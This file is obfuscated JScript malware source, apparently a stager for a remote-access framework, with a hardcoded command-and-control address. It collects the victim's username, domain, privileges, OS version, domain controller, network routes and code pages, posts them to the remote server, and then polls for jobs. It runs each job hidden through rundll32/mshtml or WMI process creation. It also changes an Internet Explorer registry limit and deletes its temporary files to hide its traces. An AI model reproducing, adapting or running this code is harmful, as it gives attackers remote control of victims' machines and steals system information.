var Object = {};

Object.scriptFilesystemObject = new ActiveXObject("Scripting.FileSystemObject");
Object.wscriptShell = new ActiveXObject("WScrip" + "t.Shell");
Object.url1 = "http://68.183.122.98:9999/zZqWg";
Object.hexIdentifier = "5c2be59041001db66d2dd47e2e503436";
Object.infectiontype = "stage";
Object.url2 = "http://68.183.122.98:9999/zZqWg?5W05LMK5BO=5c2be59041001db66d2dd47e2e503436s;TN6ZASHP6K=";
Object.int1 = "357245189942140";

Object.YELODLGIBB = function () {
    if (Object.windowIsDefined()) {

        try {
            window.close();
        }
        catch (e) { }

        try {
            window.self.close();
        }
        catch (e) { }

        try {
            window.top.close();
        }
        catch (e) { }

        try { 
            self.close(); 
        } 
        catch (e) { }

        try { 
            window.open('', '_se' + 'l' + 'f', ''); 
            window.close(); 
        }
        catch (e) { }
    }
    try { 
        WScript.quit(); 
    }
    catch (e) { }
    try { 
        var processID = Object.OORRRWLNNT.currentPID(); 
        Object.OORRRWLNNT.kill(processID); 
    }
    catch (e) { }
}

Object.windowIsDefined = function () { return typeof (window) !== "undef" + "ined"; }

Object.random = function () {
    try {
        function fun1() { 
            return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1); 
        }
        return fun1() + fun1() + '-' + fun1() + '-' + fun1() + '-' + fun1() + '-' + fun1() + fun1() + fun1();
    }
    catch (e) { }
}

Object.placeholder1 = {}; 
Object.placeholder1.whoami = function () {
    try {

        var _whoamicmd = Object.DPLYTBHFMO.PTLPEMGQCF("whoa" + "mi /" + "all", "%TE" + "MP%\\" + Object.random() + ".txt"); 

        if (_whoamicmd.indexOf("SeDebugPrivilege") == -1)
            return false; 
        else
            return true;
    }
    catch (e) { return false; }
}

Object.placeholder1.productName = function () {
    try { 
        var _productname = Object.wscriptShell.RegRead("HK" + "LM\\SOFTWARE\\Micr" + "osoft\\Windows NT\\CurrentVers" + "ion\\ProductName"); 
        var _currentbuild = Object.wscriptShell.RegRead("H" + "KLM\\SOFTWARE\\Micros" + "oft\\Windo" + "ws NT\\CurrentVersion\\Curren" + "tBuildNumber"); 
        return _productname + "***" + _currentbuild; 
    }
    catch (e) { }
    return "Unkno" + "wn";
}
Object.placeholder1.getDcName = function () {
    try {
        var _dcname = Object.wscriptShell.RegRead("HKLM\\SOFT" + "WARE\\Microsoft\\Win" + "dows\\CurrentVersion\\Group " + "Policy\\History\\DC" + "Name"); 
        if (_dcname.length > 0) { 
            return _dcname; 
        }
    }
    catch (e) { }
    return "Un" + "known";
}
Object.placeholder1.procArch = function () {
    try { var HILWFXVWZC = Object.wscriptShell.RegRead("HK" + "LM\\SY" + "STEM\\CurrentControlSet\\Contr" + "ol\\Sessi" + "on Manager\\Environment\\PROCESSO" + "R_ARCHITECTURE"); return HILWFXVWZC; }
    catch (e) { }
    return "Unk" + "nown";
}
Object.placeholder1.changeDirectory = function () {
    try { var HTOVPLNFUP = Object.DPLYTBHFMO.PTLPEMGQCF("c" + "d", "%TE" + "MP%\\" + Object.random() + ".txt"); return HTOVPLNFUP; }
    catch (e) { }
    return "";
}
Object.placeholder1.getRoutes = function () {
    try {
        var _routescommand = Object.DPLYTBHFMO.PTLPEMGQCF("route PRINT", "%TEMP%\\" + Object.random() + ".txt"); 
        var _whoamicmd = _routescommand.split("\r\n"); 
        
        for (var i = 0; i < _whoamicmd.length; i++) {
            PWGRYQPCRG = _whoamicmd[i].split(" "); 
            TNDBCIRYJQ = 4 - 4; QQJNVWICUK = 9 - 9; 
            AIUKELLABS = false; 
            
            for (var j = 0; j < PWGRYQPCRG.length; j++) {

                if (PWGRYQPCRG[j]) { 
                    QQJNVWICUK += 6 - 5; 
                    if (QQJNVWICUK == 2 + 2 && AIUKELLABS) { 
                        return PWGRYQPCRG[j]; 
                    } 
                }
                if (PWGRYQPCRG[j] == "0." + "0.0.0") {
                    TNDBCIRYJQ += 9 - 8; 
                    if (TNDBCIRYJQ == 1 + 1) { 
                        AIUKELLABS = true; 
                    }
                }
            }
        }
    }
    catch (e) { }
    return "";
}
Object.placeholder1.buildString1 = function () {

    var NTOYMIAVVE = new ActiveXObject("WSc" + "ript.Net" + "work"); 
    var LZIDWPFUWG = ""; 
    if (NTOYMIAVVE.UserDomain.length != 0) { 
        LZIDWPFUWG = NTOYMIAVVE.UserDomain; 
    }
    else { 
        LZIDWPFUWG = Object.DPLYTBHFMO.PTLPEMGQCF("echo %us" + "erdomain%", "%TE" + "MP%\\" + Object.random() + ".txt"); 
        LZIDWPFUWG = LZIDWPFUWG.split(" \r\n")[0]; 
    }
    var infoString = LZIDWPFUWG + "\\" + NTOYMIAVVE.Username; 

    if (Object.placeholder1.whoami())
        infoString += "*"; 

    var RFJQZKKKQW = NTOYMIAVVE.ComputerName; 
    infoString += "~" + "~~" + RFJQZKKKQW; infoString += "~~" + "~" + Object.placeholder1.productName(); 
    infoString += "~" + "~~" + Object.placeholder1.getDcName(); 
    infoString += "~~" + "~" + Object.placeholder1.procArch(); 
    infoString += "~" + "~~" + Object.placeholder1.changeDirectory(); 
    infoString += "~~" + "~" + Object.placeholder1.getRoutes(); 
    infoString += "~" + "~~" + Object.placeholder1.getACP(); 
    infoString += "~~" + "~" + Object.placeholder1.getOemCP(); 
    return infoString;
}
Object.placeholder1.getACP = function () {
    try { var encoder = Object.wscriptShell.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\ACP"); return encoder; }
    catch (e) { return "1252"; }
}
Object.placeholder1.getOemCP = function () {
    try { var encoder = Object.wscriptShell.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\OEMCP"); return encoder; }
    catch (e) { return "437"; }
}
Object.NVPHTAHKVX = {}; 
Object.NVPHTAHKVX.BLSOEOFFMD = function (data, headers) { 
    return Object.PXHHYLEPOA.httpPost(Object.NVPHTAHKVX.WRSQVXLIKS(), data, headers); 
}

Object.NVPHTAHKVX.PLTCYOVRTT = function (e) {
    try { 
        var headers = {}; 
        headers["errno"] = (e.number) ? e.number : "-1"; 
        headers["errname"] = (e.name) ? e.name : "Unknown"; 
        headers["errdesc"] = (e.description) ? e.description : "Unknown"; 
        return Object.NVPHTAHKVX.BLSOEOFFMD(e.message, headers); 
    }
    catch (e) { }
}
Object.NVPHTAHKVX.WRSQVXLIKS = function (jobkey) { 
    var jobkey = (typeof (jobkey) !== "undefined") ? jobkey : Object.infectiontype; 
    return Object.url2 + jobkey + ";"; 
}
Object.NVPHTAHKVX.GNKGUWJPMI = function () { 
    var url = Object.NVPHTAHKVX.WRSQVXLIKS(); 
    return Object.PXHHYLEPOA.httpPost(url); 
}
Object.NVPHTAHKVX.HTACommand = function (jobkey, fork32Bit) {
    var fork32Bit = (typeof (fork32Bit) !== "undefined") ? fork32Bit : false; var cmd = "rundll32.exe ***K***\\..\\..\\..\\./mshtml,RunHTMLApplication"; 
    if (fork32Bit)
        cmd = Object.ZFLIBJWMJW.LFDHNNEYJH() + cmd; 
        cmd = cmd.replace("***K***", Object.NVPHTAHKVX.WRSQVXLIKS(jobkey)); 
        try { 
            Object.wscriptShell.Run(cmd, 0, false);
        } catch (e) { 
            try { 
                Object.VSSGURWLEV.WCKAZXXAVX(cmd); 
            } catch (e) { 
                Object.YELODLGIBB(); 
            } 
        }
}
Object.PXHHYLEPOA = {}; Object.PXHHYLEPOA.xmlHTTP = function () {
    var http = null; 
    try { 
        http = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0"); 
        http.setTimeouts(0, 0, 0, 0);
    }
    catch (e) { 
        http = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); 
        http.setTimeouts(30000, 30000, 30000, 0); 
    }
    return http;
}

Object.PXHHYLEPOA.TZMJOJEXPZ = function (http, headers) {
    var headers = (typeof (headers) !== "undefined") ? headers : {}; 
    var content = false; 
    for (var key in headers) {
        var value = headers[key]; 
        http.setRequestHeader(key, value); 
        if (key.toUpperCase() == "CONTENT-TYPE")
            content = true;
    }
    if (!content) { 
        http.setRequestHeader("Content-Type", "application/octet-stream"); 
    }
    http.setRequestHeader("encoder", Object.placeholder1.getACP()); 
    http.setRequestHeader("shellchcp", Object.placeholder1.getOemCP()); 
    return;
}

Object.PXHHYLEPOA.httpPost = function (url, data, headers) { 
    var data = (typeof (data) !== "undefined") ? data : ""; 
    var http = Object.PXHHYLEPOA.xmlHTTP(); 
    http.open("POST", url, false); 
    Object.PXHHYLEPOA.TZMJOJEXPZ(http, headers); 
    http.send(data); 
    return http; 
}

Object.OORRRWLNNT = {}; 
Object.ILBVVNTBXX = {}; 
Object.ILBVVNTBXX.VWFDFDXXTJ = 0x80000000; 
Object.ILBVVNTBXX.SGPVUFDMIY = 0x80000001; 
Object.ILBVVNTBXX.YKEPVCGJVE = 0x80000002; 
Object.ILBVVNTBXX.BIRTFOAMYC = 0; 
Object.ILBVVNTBXX.OIJUKTUYRX = 1; 
Object.ILBVVNTBXX.ECMXBDVRBI = 2; 
Object.ILBVVNTBXX.PBHDDTLSUD = 3; 

Object.ILBVVNTBXX.stdRegProv = function (computer) { 
    var computer = (typeof (computer) !== "undefined") ? computer : "."; 
    var reg = GetObject("winmgmts:\\\\" + computer + "\\root\\default:StdRegProv"); 
    return reg; 
}

Object.ILBVVNTBXX.regCreateKey = function (hKey, path, key, value, valType, computer) {
    var reg = Object.ILBVVNTBXX.stdRegProv(computer); 
    reg.CreateKey(hKey, path); 
    if (valType == Object.ILBVVNTBXX.BIRTFOAMYC)
        reg.SetStringValue(hKey, path, key, value); 
    else if (valType == Object.ILBVVNTBXX.ECMXBDVRBI)
        reg.SetDWORDValue(hKey, path, key, value); 
    else if (valType == Object.ILBVVNTBXX.PBHDDTLSUD)
        reg.SetQWORDValue(hKey, path, key, value); 
    else if (valType == Object.ILBVVNTBXX.OIJUKTUYRX)
        reg.SetBinaryValue(hKey, path, key, value);
}
Object.VSSGURWLEV = {}; Object.VSSGURWLEV.WCKAZXXAVX = function (cmd, TLKITZUPMY) {
    var SW_HIDE = 0; 
    var pid = 0; 
    var TLKITZUPMY = (typeof (TLKITZUPMY) !== "undefined") ? TLKITZUPMY : false; 
    var XDVKPXNOBA = "winmgmts:{impersonationLevel=impersonate"; 
    
    if (TLKITZUPMY) { 
        XDVKPXNOBA += ", (DEBUG)"; 
    }

    var NNNJELVVLF = "}!\\\\.\\root\\cimv2"; 
    var wmi = GetObject(XDVKPXNOBA + NNNJELVVLF); 
    var si = wmi.Get("Win" + "32_ProcessStartup").SpawnInstance_(); 
    si.ShowWindow = SW_HIDE; 
    si.CreateFlags = 16777216; 
    si.X = si.Y = si.XSize = si.ySize = 1; 
    var w32proc = wmi.Get("Win32_Process"); 
    var method = w32proc.Methods_.Item("Create"); 
    var inParams = method.InParameters.SpawnInstance_(); 
    inParams.CommandLine = cmd; 
    inParams.CurrentDirectory = null; 
    inParams.ProcessStartupInformation = si; 
    var outParams = w32proc.ExecMethod_("Create", inParams); 
    return outParams.ProcessId;
}

Object.DPLYTBHFMO = {}; 
Object.DPLYTBHFMO.PTLPEMGQCF = function (cmd, stdOutPath) {
    cmd = "chcp " + Object.placeholder1.getOemCP() + " & " + cmd; 
    var c = "%comspec% /q /c " + cmd + " 1> " + Object.ZFLIBJWMJW.getEnvString(stdOutPath); 
    c += " 2>&1"; Object.wscriptShell.Run(c, 0, true); 

    if (Object.placeholder1.getACP() == "936") { 
        var data = Object.ZFLIBJWMJW.openFileAndPing(stdOutPath); 
    }
    else { 
        var data = Object.ZFLIBJWMJW.certUtilEnc(stdOutPath); 
    }
    Object.ZFLIBJWMJW.deleteFilePath(stdOutPath); 
    return data;
}

Object.DPLYTBHFMO.comspecCmd = function (cmd, fork) { 
    var fork = (typeof (fork) !== "undefined") ? fork : true; 
    var c = "%comspec% /q /c " + cmd; 
    Object.wscriptShell.Run(cmd, 5 - 5, !fork); 
}

Object.ZFLIBJWMJW = {}; 
Object.ZFLIBJWMJW.getEnvString = function (path) { 
    return Object.wscriptShell.ExpandEnvironmentStrings(path); 
}

Object.ZFLIBJWMJW.LFDHNNEYJH = function () {

    var base = Object.ZFLIBJWMJW.getEnvString("%WINDIR%"); 
    var syswow64 = base + "\\SysWOW64\\"; 
    if (Object.scriptFilesystemObject.FolderExists(syswow64))
        return syswow64; return base + "\\System32\\";
}

Object.ZFLIBJWMJW.openFileAndPing = function (path) {
    var loopcount = 0; 
    while (true) {
        if (Object.scriptFilesystemObject.FileExists(Object.ZFLIBJWMJW.getEnvString(path)) && Object.scriptFilesystemObject.GetFile(Object.ZFLIBJWMJW.getEnvString(path)).Size > 0) {
            try { 
                var fd = Object.scriptFilesystemObject.OpenTextFile(Object.ZFLIBJWMJW.getEnvString(path), 1, false, 0); 
                var data = fd.ReadAll(); 
                fd.Close(); 
                return data; 
            }
            catch (e) { 
                Object.DPLYTBHFMO.comspecCmd("ping 127." + "0.0.1 -n 2", false); 
                continue; 
            }
        }
        else {
            loopcount += 1; 
            if (loopcount > 180) { 
                return ""; 
            }
            Object.DPLYTBHFMO.comspecCmd("ping 127." + "0.0.1 -n 2", false);
        }
    }
}

Object.ZFLIBJWMJW.certUtilEnc = function (path, exists, certutil) {

    var exists = (typeof (exists) !== "undefined") ? exists : false; 
    var certutil = (typeof (certutil) !== "undefined") ? certutil : false; 

    if (!Object.scriptFilesystemObject.FileExists(Object.ZFLIBJWMJW.getEnvString(path)) && exists) { 
        var headers = {}; 
        headers["Status"] = "NotExist"; 
        Object.NVPHTAHKVX.BLSOEOFFMD("", headers); 
        return ""; 
    }
    var loopcount = 0; 
    while (true) {
        if (Object.scriptFilesystemObject.FileExists(Object.ZFLIBJWMJW.getEnvString(path)) && Object.scriptFilesystemObject.GetFile(Object.ZFLIBJWMJW.getEnvString(path)).Size > 0) {
                if (Object.placeholder1.getACP() == "936" || certutil) { 
                    var newout = "%TEMP%\\" + Object.random() + ".t" + "xt"; 
                    Object.DPLYTBHFMO.comspecCmd("certut" + "il -encode " + Object.ZFLIBJWMJW.getEnvString(path) + " " + newout); 
                    var data = Object.ZFLIBJWMJW.openFileAndPing(newout); 
                    Object.ZFLIBJWMJW.deleteFilePath(newout); 
                }
                else { 
                    var fp = Object.scriptFilesystemObject.GetFile(Object.ZFLIBJWMJW.getEnvString(path)); 
                    var fd = fp.OpenAsTextStream(); 
                    var data = fd.read(fp.Size); 
                    fd.close(); 
                }
            return data;
        }
        else {
            loopcount += 1; 
            if (loopcount > 180) { 
                return ""; 
            }
            Object.DPLYTBHFMO.comspecCmd("ping 127." + "0.0.1 -n 2", false);
        }
    }
}

Object.ZFLIBJWMJW.deleteFilePath = function (path) { 
    Object.scriptFilesystemObject.DeleteFile(Object.ZFLIBJWMJW.getEnvString(path), true); 
}; 


try {
    if (Object.infectiontype != "stage") {

        if (Object.windowIsDefined()) { 
            var path = "SOFTWARE\\Microsoft\\Internet Explorer\\Styles"; 
            var key = "MaxScriptStatements"; 
            Object.ILBVVNTBXX.regCreateKey(Object.ILBVVNTBXX.SGPVUFDMIY, path, key, 0xFFFFFFFF, Object.ILBVVNTBXX.ECMXBDVRBI); 
        }
        Object.NVPHTAHKVX.BLSOEOFFMD(Object.placeholder1.buildString1()); 
        try { 
            Object.NVPHTAHKVX.HTACommand("");
        } 
        catch (e) { 
            Object.NVPHTAHKVX.PLTCYOVRTT(e) 
        }
        Object.YELODLGIBB();
    }
    else {
        if (Object.windowIsDefined())
            DoWorkTimeout(); 
        else
            DoWorkLoop();
    }
}
catch (e) { 
    Object.NVPHTAHKVX.PLTCYOVRTT(e); 
}
function DoWork() {
    var epoch = new Date().getTime(); 
    var expire = parseInt(Object.int1); 
    if (epoch > expire) { 
        return false; 
    }
    try {
        var work = Object.NVPHTAHKVX.GNKGUWJPMI(); 
        if (work.status == 201 || work.status == 202) { 
            if (work.responseText.length > 0) { 
                var jobkey = work.responseText; 
                Object.NVPHTAHKVX.HTACommand(jobkey, work.status == 202); 
            } 
        }
        else { 
            return false; 
        }
    }
    catch (e) { 
        return false; 
    }
    return true;
}
function DoWorkLoop() { 
    while (DoWork()); 
    Object.YELODLGIBB(); 
}
function DoWorkTimeout() {
    for (var i = 0; i < 10; ++i) {
        if (!DoWork()) { 
            Object.YELODLGIBB(); 
            return; 
        }
    }
    Object.NVPHTAHKVX.HTACommand(""); 
    Object.YELODLGIBB();
}
